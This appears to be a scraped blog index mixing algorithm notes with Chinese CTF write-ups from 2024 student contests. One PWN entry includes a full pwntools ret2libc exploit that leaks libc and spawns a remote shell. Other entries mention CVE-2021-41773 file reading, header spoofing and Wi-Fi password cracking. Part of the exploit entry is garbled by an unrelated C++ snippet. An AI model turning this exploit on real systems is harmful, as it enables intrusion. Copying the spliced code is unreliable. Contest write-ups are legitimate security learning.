vector\u003cint\u003e(n+1,0)); int m = queries.size(); for(int i = 0; i \u003c m; i++) { tmp[queries[i][0]][queries[i][1]]++; tmp[queries[i][0]][queries[i][3]+1]--; tmp[queries[i][2]+1][queries[i][1]]--; tmp[queries[i][2]+1][queries[i][3]+1]++; }//对差分数组进行操作 vector\u003cvector\u003cint\u003e\u003e ans(n , vector\u003cint\u003e(n , 0)); ans[0][0] = tmp[0][0]; for(int i = 0; i \u003c n; ++i) for(int j = 1; j \u003c n; ++j) tmp[i][j] += tmp[i][j-1]; for(int i = 1; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) tmp[i][j] += tmp[i-1][j]; for(int i = 0; i \u003c n; ++i) for(int j = 0; j \u003c n; ++j) ans[i][j] = tmp[i][j]; //由于下标从0开始，所以分布求前缀和要方便一点 //这种写法不存在重复加的地方，第一个for求一维前缀和，第二个for加上前面行的和。 return ans; } }; ","date":"2024-06-11","objectID":"/posts/%E5%B7%AE%E5%88%86/:3:0","tags":["算法"],"title":"差分","uri":"/posts/%E5%B7%AE%E5%88%86/"},{"categories":["信息安全"],"content":"WriteUp\r名称\rxxxxx 排名\r3 解题思路\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:0:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"MISC\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF1\r用010编辑器打开图片，文件末尾字符串粘贴至编码工具解码即可 ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:1","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF3\r首先使用筛选工具将含password文本的行筛选出来再进行url解码，将获得的文本放入txt中进行分析。 可以发现这个txt文本是报错注入的日记文件，只需要将查询flag的没报错的语句的查询值（ascii）拼接起来就是flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:2","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF2\r题目提示是CVE-2021-41773漏洞，搜索漏洞利用方法直接文件读取 ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:3","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"CTF5\r访问网站提示ip不对，需要访问ip为1.1.1.1，使用bp抓包修改X-Forworded-For为1.1.1.1在返回信息中就可以找到flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:1:4","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"Crypto\r","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:0","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"simple\r文件名为放射，谐音仿射密码，同时密文类似flag格式，仿射密码恰好只对字母进行加密。 from Crypto.Util.number import inverse flag = ''.join(i if i not in \"qwertyuiopasdfghjklzxcvbnm\" else chr(((ord(i)-ord('a') - 321564))*inverse(123456,13)%13+ord('a')) for i in 'kgws{m8u8cm65-ue9k-44k5-8361-we225m76eeww}') print(flag)","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:1","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"b64\r题目给了一个密文，和一组对应的明文密文，因此肯定是先通过已知对应明密文破解出加密算法，再利用加密算法和密文得到flag。根据题目名称b64，将给定明文加密一下看，发现指定位置变换相同，所以本题应该是一个单表代换再加一个base64解密。大致得到对应表如上，但是很糟糕的是，明密文变换没有直接的对应关系，这里应该是随机映射。所以我们需要进行暴力破解。 统计一下已知的字母变换对，发现有22个字符还不知道。而未知的9个位置中，有6种不同字符。爆破6种字符的选择，再根据flag格式flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}以及内容均为09af来验证是否可能为正确答案。大致代码如下： # -*- coding: utf-8-*- from base64 import * from string import * def check(s): for i in s: if i not in \"flag{-1234567890abcdef}\": return False return True flag = 'uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz' a='pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF=' b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM=' alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefABCDEF+/' FLAG='' print(\"fail words\") for i in flag: if i in a: index = a.index(i) FLAG+=b[index] else: FLAG+='!' print i, print \"\\nFLAG cipher\" print FLAG #'ZmxhZ3sxZTNhMm!lN!0xYz!yLT!mNGYtOWIyZ!!hNGFmYW!kZj!xZTZ!' print \"alternative words\" aw=\"\" for i in alpha: if i not in b: aw += i print aw '@#$%^\u0026' table = 'ACHJKPRVefnuvw156789efAC+/' print(\"for z\") for i in table: if b64decode(\"ZTZ\"+i)[-1] == '}': FLAG = FLAG.replace(\"ZTZ!\",\"ZTZ9\") table = table.replace(i,\"\") #print FLAG print(\"for G\") for i in table: if check(b64decode(\"Zj\"+i+\"x\")) and check(b64decode(\"Yz\"+i+\"y\")): #print b64decode(\"Zj\"+i+\"x\") FLAG = FLAG.replace(\"Zj!x\",\"Zj\"+i+\"x\").replace(\"Yz!y\",\"Yz\"+i+\"y\") table = table.replace(i,\"\") #print i #print FLAG print(\"for I and s\") for i in table: for j in table: if check(b64decode(\"N\"+i+\"0x\")) and check(b64decode(\"Z\"+i+j+\"h\")): #print b64decode(\"N\"+i+\"0x\"),b64decode(\"Z\"+i+j+\"h\") FLAG = FLAG.replace(\"N!0x\",\"N\"+i+\"0x\").replace(\"Z!!h\",\"Z\"+i+j+\"h\") table = table.replace(i,\"\").replace(j,\"\") #print i,j #print FLAG print(\"for X and E\") for i in table: for j in table: if j == i: continue s = b64decode(FLAG.replace(\"Mm!l\",\"Mm\"+i+\"l\").replace(\"LT!m\",\"LT\"+i+\"m\").replace(\"YW!k\",\"YW\"+j+'k')) if check(s): print s枚举得到的flag ","date":"2024-06-11","objectID":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/:2:2","tags":["CTF"],"title":"抽象校赛","uri":"/posts/%E6%8A%BD%E8%B1%A1%E6%A0%A1%E8%B5%9B/"},{"categories":["信息安全"],"content":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Writeup\r网络安全\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:0:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"MISC\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"wifi密码\r根据题目提示，使用crunch指令生成字典。 使用aircrack-ng工具结合自定义字典进行密码爆破得到flag{power456} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:1","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"5GC网元AMF名称\r根据题目提示猜测有一个包里面的字段为AMFName，直接搜索，得到密文。 解密得到flag:flag{amfname-ujrr1123} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:2","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"Tunnel\r按协议类型排序，将所有ICMP协议包中的请求包的数据长度转为ASCII字符即得到flag。 flag{iCmp_1s_tO0_Ea5y} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:3","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"ezdmp\r取证工具发现有一个result.txt文件，将其读取出来。 发现Password对应的值形似flag，盲猜就是提交发现确实是flag flag{ROck_4nd_Sh4N9H41} ","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:1:4","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"PWN\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:0","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"推箱子\r运行程序，发现是简单的推箱子游戏，和题目描述一致。使用ida打开文件，能够发现明显的栈溢出漏洞。 read函数存在栈溢出漏洞。分析程序可知，v6的值随着角色每次移动都会增大，所以只需要先让角色移动一定长度后再通过游戏即可让v6的大小大于栈长度，实现栈溢出。 payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww'xxxxxxxxxx void print(ll n){ ll d = n / 4; if(n % 4 == 0){ cout « d « ’ ’ « d « ’ ’ « d * 2 « ‘\\n’; }else if(n % 4 == 1){ cout « 1 « ’ ’ « (n - 1) / 2 « ’ ’ « (n - 1) / 2 « ‘\\n’; }else if(n % 4 == 2){ cout « 2 « ’ ’ « (n - 2) / 2 « ’ ’ « (n - 2) / 2 « ‘\\n’; }else{ cout « 1 « ’ ’ « (n - 1) / 2 « ’ ’ « (n - 1) / 2 « ‘\\n’; }}void solve(){ ll n, k; cin » n » k; if(k == 3){ print(n); }else{ for(int i = 1; i \u003c= k - 3; i++) cout « 1 « ’ ‘; n -= k - 3; print(n); }}c++ from pwn import * context(os='linux',arch='amd64',log_level = 'debug') def get_addr(): return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) p = remote(\"222.67.132.186\",23267) elf = ELF('./game') _libc = ELF('./libc.so.6') pop_rdi_addr = 0x400cf3 ret_addr = 0x400576 main_addr = 0x4006D7 _p_libc_system = _libc.symbols['system'] _p_libc_binsh = _libc.search(b'/bin/sh').__next__() _p_libc_puts = _libc.symbols['puts'] puts_plt = elf.plt['puts'] #puts函数的入口地址 puts_got = elf.got['puts'] #puts函数的got表地址 payload = 0x570 * b'da' + b'ddwwwwssdwwssassdwwwsssdww' p.sendline(payload) payload2 = 0x570 * b'A' + 0x8 * b'A' + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr) p.sendlineafter( b'Grandmaster, Please leave your name:',payload2) real_puts_addr = get_addr() print(hex(real_puts_addr)) libc_base = real_puts_addr - _p_libc_puts p_system = libc_base + _p_libc_system p_binsh = libc_base + _p_libc_binsh p.sendline(payload) payload3 = 0x570 * b'A' + 0x8 * b'A' + p64(ret_addr) + p64(pop_rdi_addr) + p64(p_binsh) + p64(p_system) p.sendlineafter( b'Grandmaster, Please leave your name:',payload3) p.interactive()数据安全\r","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:1","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["信息安全"],"content":"口令画像分析一 \u0026 二\r按照题目约束条件，编写程序分析即可。 得到题目一答案为5014,4954,5052,4980 得到题目二答案为129， 用MD532位小写加密即为答案。 flag{711314c61e9b9172a6688573498c8321} flag{d1f491a404d6854880943e5c3cd9ca25} package main import ( \"fmt\" \"github.com/360EntSecGroup-Skylar/excelize\" ) func main() { // 打开 Excel 文件 f, err := excelize.OpenFile(\"./user.xlsx\") if err != nil { fmt.Println(err) return } // 读取 Sheet1 中 A1 单元格的值 // from C2 to C20001 cnt1 := 0 cnt2 := 0 cnt3 := 0 cnt4 := 0 cnt5 := 0 for i := 2; i \u003c= 20001; i++ { s := fmt.Sprintf(\"C%d\", i) s1 := fmt.Sprintf(\"D%d\", i) cellValue := f.GetCellValue(\"Sheet1\", s) id := f.GetCellValue(\"Sheet1\", s1) //fmt.Println(cellValue) if err != nil { fmt.Println(err) return } // 输出单元格值 flag := 0 for j := 0; j \u003c len(cellValue); j++ { if cellValue[j] \u003e= '0' \u0026\u0026 cellValue[j] \u003c= '9' { flag |= 1 } else if cellValue[j] \u003e= 'a' \u0026\u0026 cellValue[j] \u003c= 'z' { flag |= 2 } else if cellValue[j] \u003e= 'A' \u0026\u0026 cellValue[j] \u003c= 'Z' { flag |= 4 } else { flag |= 8 } } if flag == 1 || flag == 2 { cnt1++ } else if flag == 3 { cnt2++ } else if flag == 7 { //fmt.Println(cellValue) cnt3++ } else if flag == 15 { //fmt.Println(cellValue) cnt4++ year := 0 sex := 0 if id[16] == 'X' { sex = 1 } else { if (id[16]-'0')%2 == 0 { sex = 1 } } for j := 6; j \u003c= 9; j++ { year = year*10 + (int)(id[j]-'0') } //month := 0 day := (id[12]-'0')*10 + (id[13] - '0') month := (id[10]-'0')*10 + (id[11] - '0') if day \u003e 31 { fmt.Println(day) } if year == 2002 \u0026\u0026 sex == 1 { if month == 5 \u0026\u0026 day \u003e= 21 { cnt5++ } if month == 6 \u0026\u0026 day \u003c= 21 { cnt5++ } } } } fmt.Println(cnt1) fmt.Println(cnt2) fmt.Println(cnt3) fmt.Println(cnt4) fmt.Println(cnt1 + cnt2 + cnt3 + cnt4) fmt.Println(cnt5) }","date":"2024-06-11","objectID":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/:2:2","tags":["CTF"],"title":"第九届上海市大学生网络安全大赛暨“磐石行动”2024第二届全国高校网络安全攻防活动 初赛 个人Wirteup","uri":"/posts/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A82024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%B4%BB%E5%8A%A8-%E5%88%9D%E8%B5%9B-%E4%B8%AA%E4%BA%BAwriteup/"},{"categories":["算法和数据结构"],"content":"Problem - 1339B - Codeforces\r将数组排序后，从中间元素开始，左右依次插入即可，可以保证绝对值差距越来越大。 #include \u003ccstdio\u003e #include \u003calgorithm\u003e #include \u003ciostream\u003e #include \u003ccmath\u003e #include \u003cbits/stdc++.h\u003e #define input_int(n) scanf(\"%d\", \u0026n) using namespace std; typedef long long ll; typedef unsigned long long ull; typedef vector\u003cint\u003e vi; typedef pair\u003cint, int\u003e pii; void solve(){ int n; scanf(\"%d\", \u0026n); vector\u003cint\u003e f(n); for(int i = 0; i \u003c n; i++) scanf(\"%d\", \u0026f[i]); sort(f.begin(), f.end()); int l = (n - 1)/2, r = l + 1; for(int i = 0; i \u003c n; i++){ if(i % 2 == 0){ cout \u003c\u003c f[l] \u003c\u003c ' '; l--; } else{ cout \u003c\u003c f[r] \u003c\u003c ' '; r++; } } cout \u003c\u003c '\\n'; } int main() { int t; scanf(\"%d\", \u0026t); while(t--){ solve(); } return 0; }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1352G 构造排列\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r构造序列，满足相邻数之间的绝对值差X满足2 \u003c= x \u003c= 4 ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r分奇偶 void solve(){ int n; cin \u003e\u003e n; if(n \u003c 4){ cout \u003c\u003c -1 \u003c\u003c '\\n'; return; } vector\u003cint\u003e f; for(int i = (n % 2 == 0? 2:1); i \u003c= n; i += 2) f.push_back(i); int mx = f[f.size() - 1]; if(mx \u003e 